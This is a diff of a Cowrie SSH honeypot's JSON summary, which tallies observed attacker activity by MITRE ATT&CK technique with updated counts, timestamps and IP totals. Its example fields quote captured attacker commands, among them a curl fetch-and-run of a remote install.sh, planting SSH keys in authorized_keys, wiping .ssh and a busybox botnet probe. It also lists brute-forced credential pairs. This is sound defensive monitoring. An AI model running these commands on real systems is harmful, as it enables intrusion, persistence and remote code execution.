@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-20 13:05:08",
+  "generated": "2026-09-20 14:00:08",
   "totals": {
-    "commands": 1071,
-    "login_failed": 3490,
-    "login_success": 223,
-    "sessions": 3783
+    "commands": 1099,
+    "login_failed": 3573,
+    "login_success": 228,
+    "sessions": 3891
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3490,
+      "count": 3573,
       "examples": [
         "zhy / zhy",
         "vivek / 123123",
@@ -21,14 +21,14 @@
         "admin / 28081979"
       ],
       "first": "2026-09-20T00:00:25.589298Z",
-      "last": "2026-09-20T13:04:30.368844Z",
-      "unique_ips": 87
+      "last": "2026-09-20T13:59:58.083334Z",
+      "unique_ips": 90
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 223,
+      "count": 228,
       "examples": [
         "root / LeitboGi0ro",
         "lghkel\\x09 / zpz}ld\\x09",
@@ -37,14 +37,14 @@
         "root / root"
       ],
       "first": "2026-09-20T01:13:40.450590Z",
-      "last": "2026-09-20T12:58:09.774487Z",
-      "unique_ips": 65
+      "last": "2026-09-20T13:45:02.060156Z",
+      "unique_ips": 70
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 186,
+      "count": 198,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "cat /proc/cpuinfo | grep name | wc -l",
@@ -53,14 +53,14 @@
         "uname -m"
       ],
       "first": "2026-09-20T01:13:47.893205Z",
-      "last": "2026-09-20T12:58:38.278144Z",
-      "unique_ips": 31
+      "last": "2026-09-20T13:45:14.394937Z",
+      "unique_ips": 34
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 147,
+      "count": 149,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "ls -lh $(which ls)",
@@ -69,14 +69,14 @@
         "ls /home; /bin/busybox BOTNET"
       ],
       "first": "2026-09-20T01:13:47.893205Z",
-      "last": "2026-09-20T12:58:25.285816Z",
-      "unique_ips": 24
+      "last": "2026-09-20T13:42:21.544919Z",
+      "unique_ips": 26
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 102,
+      "count": 104,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -85,14 +85,14 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-20T01:13:43.828905Z",
-      "last": "2026-09-20T12:58:12.100561Z",
-      "unique_ips": 36
+      "last": "2026-09-20T13:32:09.385793Z",
+      "unique_ips": 37
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 64,
+      "count": 65,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -101,14 +101,14 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-20T01:13:44.786465Z",
-      "last": "2026-09-20T12:58:12.481585Z",
-      "unique_ips": 30
+      "last": "2026-09-20T13:32:09.630764Z",
+      "unique_ips": 31
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 46,
+      "count": 48,
       "examples": [
         "w",
         "whoami",
@@ -117,14 +117,14 @@
         "id"
       ],
       "first": "2026-09-20T01:33:34.606580Z",
-      "last": "2026-09-20T12:58:35.689035Z",
-      "unique_ips": 27
+      "last": "2026-09-20T13:32:28.376559Z",
+      "unique_ips": 28
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 40,
+      "count": 44,
       "examples": [
         "crontab -l",
         "top",
@@ -132,21 +132,21 @@
         "ps -ef | grep '[Mm]iner'"
       ],
       "first": "2026-09-20T01:33:34.297868Z",
-      "last": "2026-09-20T12:58:31.875740Z",
-      "unique_ips": 20
+      "last": "2026-09-20T13:42:20.890077Z",
+      "unique_ips": 22
     },
     {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 21,
+      "count": 22,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
       ],
       "first": "2026-09-20T01:13:43.828905Z",
-      "last": "2026-09-20T12:58:12.100561Z",
-      "unique_ips": 21
+      "last": "2026-09-20T13:32:09.385793Z",
+      "unique_ips": 22
     },
     {
       "id": "T1070.004",
@@ -205,13 +205,13 @@
       "id": "T1016",
       "name": "System Network Configuration Discovery",
       "tactic": "Discovery",
-      "count": 1,
+      "count": 2,
       "examples": [
         "ifconfig"
       ],
       "first": "2026-09-20T08:20:21.959076Z",
-      "last": "2026-09-20T08:20:21.959076Z",
-      "unique_ips": 1
+      "last": "2026-09-20T13:42:18.299659Z",
+      "unique_ips": 2
     },
     {
       "id": "T1037",
